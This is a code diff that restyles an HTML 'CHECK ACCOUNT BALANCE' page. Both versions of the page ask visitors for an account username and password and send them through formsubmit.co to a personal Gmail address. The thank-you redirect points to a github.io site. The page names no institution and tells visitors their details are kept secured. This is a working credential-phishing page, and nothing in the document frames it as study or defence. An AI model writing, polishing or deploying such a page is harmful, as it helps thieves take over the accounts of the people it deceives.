@@ -1,116 +1,111 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CHECK ACCOUNT BALANCE</title>
   <style>
-    :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;}
-    body{
-      margin:0;
-      background:#f5f7fb;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
     }
-    .card{
-      background:#fff;
-      padding:24px;
-      border-radius:0; /* flat edges for full width */
-      box-shadow:none;
-      width:100%;
-      min-height:100vh; /* fill phone height */
-      box-sizing:border-box;
+    .container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      width: 95%;
+      max-width: 420px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
     }
-    h1{
-      margin:0 0 18px;
-      font-size:22px;
-      letter-spacing:2px;
-      text-align:center;
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
     }
-    label{
-      display:block;
-      margin-bottom:6px;
-      font-size:15px;
-      color:#333;
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
     }
-    input[type="text"],input[type="password"]{
-      width:100%;
-      padding:14px;
-      border:1px solid #d6dbe8;
-      border-radius:8px;
-      font-size:16px;
+    .toggle-container {
+      position: relative;
     }
-    .row{margin-top:20px;}
-    button.submit{
-      width:100%;
-      padding:14px;
-      border-radius:10px;
-      border:0;
-      background:#1f7aef;
-      color:#fff;
-      font-weight:600;
-      font-size:16px;
-      cursor:pointer;
+    .toggle-container button {
+      position: absolute;
+      right: 10px;
+      top: 12px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 14px;
     }
-    .toggle{
-      position:absolute;
-      right:14px;
-      top:43px;
-      background:none;
-      border:none;
-      cursor:pointer;
-      color:#555;
-      font-size:14px;
+    button[type="submit"] {
+      background: #28a745;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
     }
-    .field-wrapper{
-      position:relative;
-      margin-top:18px;
+    button[type="submit"]:hover {
+      background: #218838;
     }
-    .confident{
-      margin-top:18px;
-      font-size:14px;
-      color:#0b6b3a;
-      background:#e6fbf0;
-      padding:12px;
-      border-radius:8px;
-      text-align:center;
+    .note {
+      font-size: 12px;
+      text-align: center;
+      color: #555;
+      margin-top: 12px;
     }
   </style>
 </head>
 <body>
-  <main class="card" role="main">
-    <h1>CHECK ACCOUNT BALANCE</h1>
+  <div class="container">
+    <h2>CHECK ACCOUNT BALANCE</h2>
 
-    <form action="https://formsubmit.co/exellentfirm@gmail.com" 
-          method="POST" autocomplete="off" novalidate>
-      <input type="hidden" name="_next" value="thankyou.html">
-      <input type="hidden" name="_captcha" value="false">
+    <!-- ✅ Make sure email is verified in FormSubmit first -->
+    <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
+      <!-- redirect to your thankyou.html -->
+      <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/thankyou.html">
 
-      <div class="field-wrapper">
-        <label for="username">Enter your Account Username</label>
-        <input id="username" name="username" type="text" required aria-required="true" />
+      <label for="username">Enter your Account Username</label>
+      <input type="text" id="username" name="username" required>
+
+      <label for="password">Enter your Account Password</label>
+      <div class="toggle-container">
+        <input type="password" id="password" name="password" required>
+        <button type="button" onclick="togglePassword()">Show</button>
       </div>
 
-      <div class="field-wrapper">
-        <label for="password">Enter your Account Password</label>
-        <input id="password" name="password" type="password" required aria-required="true" />
-        <button type="button" id="togglePassword" class="toggle">Show</button>
-      </div>
-
-      <div class="confident">Thank you, We keep your details and data secured</div>
-
-      <div class="row">
-        <button type="submit" class="submit">Check Balance</button>
-      </div>
+      <button type="submit">Check Balance</button>
     </form>
-  </main>
+
+    <div class="note">
+      Thank you, We keep your details and data secured.
+    </div>
+  </div>
 
   <script>
-    const togglePassword = document.getElementById('togglePassword');
-    const password = document.getElementById('password');
-    togglePassword.addEventListener('click', () => {
-      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
-      password.setAttribute('type', type);
-      togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
-    });
+    function togglePassword() {
+      const pwd = document.getElementById("password");
+      const btn = pwd.nextElementSibling;
+      if (pwd.type === "password") {
+        pwd.type = "text";
+        btn.textContent = "Hide";
+      } else {
+        pwd.type = "password";
+        btn.textContent = "Show";
+      }
+    }
   </script>
 </body>
 </html>
